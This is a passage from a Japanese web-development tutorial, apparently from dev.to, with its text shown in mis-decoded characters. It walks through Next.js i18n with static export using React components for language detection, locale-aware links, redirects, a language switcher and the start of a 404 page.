  children<span class="token operator">:</span> ReactNode<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">LanguageWrapper</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> children <span class="token punctuation">}</span><span class="token operator">:</span> LanguageWrapperProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span>
      query<span class="token operator">:</span> <span class="token punctuation">{</span> locale <span class="token punctuation">}</span><span class="token punctuation">,</span>
      asPath<span class="token punctuation">,</span>
      isReady<span class="token punctuation">,</span>
    <span class="token punctuation">}</span> <span class="token operator">=</span> router<span class="token punctuation">;</span>

    <span class="token comment">// Check if the current route has accurate locale</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>isReady <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>asPath<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>router<span class="token punctuation">,</span> detectedLng<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token operator">&amp;&amp;</span>
    i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    router<span class="token punctuation">.</span>asPath<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>detectedLng <span class="token operator">??</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token punctuation">{</span>children<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>æ¬¡ã«ã€_app.tsxãƒ•ã‚¡ã‚¤ãƒ«ã«LanguageWrapperã‚’è¿½åŠ ã—ã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F29bc07vta3ak6cnooiig.png"></p>
<p>ã‚ã¨ã‚‚ã†ä¸€æ¯ã§ã™ã€‚<code class="language-text">src/components/_shared</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«<code class="language-text">Link.tsx</code>ã¨ã„ã†åå‰ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> ReactNode <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> NextLink <span class="token keyword">from</span> <span class="token string">"next/link"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LinkProps</span> <span class="token punctuation">{</span>
  children<span class="token operator">:</span> ReactNode<span class="token punctuation">;</span>
  skipLocaleHandling<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">;</span>
  locale<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  href<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  target<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">Link</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span>
  children<span class="token punctuation">,</span>
  skipLocaleHandling<span class="token punctuation">,</span>
  target<span class="token punctuation">,</span>
  <span class="token operator">...</span>rest
<span class="token punctuation">}</span><span class="token operator">:</span> LinkProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> locale <span class="token operator">=</span> rest<span class="token punctuation">.</span>locale <span class="token operator">||</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> skipLocaleHandling <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>locale <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skipLocaleHandling<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    href <span class="token operator">=</span> href
      <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>locale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>href<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
      <span class="token operator">:</span> router<span class="token punctuation">.</span>pathname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[locale]"</span><span class="token punctuation">,</span> locale<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">NextLink</span></span> <span class="token attr-name">href</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>href<span class="token punctuation">}</span></span> <span class="token attr-name">target</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span>children<span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">NextLink</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã¯ã€next/linkã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä»£ã‚ã‚Šã«ã“ã®<code class="language-text">Link</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
<p>æ¬¡ã«ã€<code class="language-text">hooks</code>ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«<code class="language-text">useRouteRedirect.ts</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useRouteRedirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">redirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span>to<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> replace<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token operator">?</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span>
      <span class="token operator">:</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>to<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// prevent endless loop</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> router<span class="token punctuation">.</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>replace<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span> redirect <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ä»¥ä¸‹ã«ç¤ºã™ã¨ãŠã‚Šã€<code class="language-text">router.push</code>ã¨<code class="language-text">router.replace</code>ã®ä»£ã‚ã‚Šã«ã“ã®ã‚«ã‚¹ã‚¿ãƒ ãƒ•ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fence2oltrv1xrk67ig8v.png"></p>
<p>æ¬¡ã«ã€<code class="language-text">src/components</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ä¸­ã«<code class="language-text">LanguageSwitcher.tsx</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã§ç‰¹å®šã®è¨€èªã«åˆ‡ã‚Šæ›¿ãˆã‚‰ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> Link <span class="token keyword">from</span> <span class="token string">"next/link"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LanguageSwitcherProps</span> <span class="token punctuation">{</span>
  locale<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  href<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  asPath<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">LanguageSwitcher</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span>
  locale<span class="token punctuation">,</span>
  <span class="token operator">...</span>rest
<span class="token punctuation">}</span><span class="token operator">:</span> LanguageSwitcherProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>
  <span class="token keyword">let</span> pName <span class="token operator">=</span> router<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
  Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">===</span> <span class="token string">"locale"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      pName <span class="token operator">=</span> pName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> locale<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    pName <span class="token operator">=</span> pName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>locale<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    href <span class="token operator">=</span> rest<span class="token punctuation">.</span>href <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>locale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>rest<span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span> <span class="token operator">:</span> pName<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span>
      <span class="token attr-name">href</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>href<span class="token punctuation">}</span></span>
      <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span>
        languageDetector<span class="token punctuation">.</span>cache <span class="token operator">?</span> languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>locale<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
      <span class="token punctuation">}</span></span>
    <span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">"small"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token punctuation">{</span>locale<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãŠç–²ã‚Œæ§˜ã§ã™ï¼<code class="language-text">output: export</code>ã‚’ä½¿ç”¨ã—ã¦Next.jsã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«i18nã‚’ç„¡äº‹å®Ÿè£…ã§ãã¾ã—ãŸã€‚å‹•çš„ã«åå‰ç©ºé–“ã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹å ´åˆãªã©ã€ç•°ãªã‚‹åå‰ç©ºé–“ã‹ã‚‰ç¿»è¨³ã‚’èª­ã¿è¾¼ã¿ãŸã„å ´åˆã¯ã€<code class="language-text">I18nProvider</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä¸­ã®<code class="language-text">_app.tsx</code>ã§å„åå‰ç©ºé–“ã¨ãã‚Œãã‚Œã«å¯¾å¿œã™ã‚‹ç¿»è¨³ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®šç¾©ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã‚’è¦šãˆã¦ãŠã„ã¦ãã ã•ã„ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fw68zgdlq0mmqsfdawaax.png"></p>
<p>ãƒ“ãƒ«ãƒ‰ã‚’ä½œæˆã—ã¦ã‹ã‚‰ãƒ†ã‚¹ãƒˆã‚’è¡Œã†å‰ã«ã€<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«<code class="language-text">404.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¦ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">FC</span><span class="token punctuation">,</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NextRouter<span class="token punctuation">,</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> getRouteRegex <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/route-regex"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> getClientBuildManifest <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/client/route-loader"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> parseRelativeUrl <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/parse-relative-url"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> isDynamicRoute <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/is-dynamic"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> removeTrailingSlash <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/dist/shared/lib/router/utils/remove-trailing-slash"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Link <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/components/_shared/Link"</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"production"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> sortedPages <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getClientBuildManifest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> sortedPages<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window <span class="token operator">!==</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token operator">?.</span>sortedPages<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token punctuation">.</span>sortedPages<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> window<span class="token punctuation">.</span>__BUILD_MANIFEST<span class="token punctuation">.</span>sortedPages<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getDoesLocationMatchPage</span><span class="token punctuation">(</span>location<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> pages <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> parsed <span class="token operator">=</span> <span class="token function">parseRelativeUrl</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> <span class="token punctuation">{</span> pathname <span class="token punctuation">}</span> <span class="token operator">=</span> parsed<span class="token punctuation">;</span>
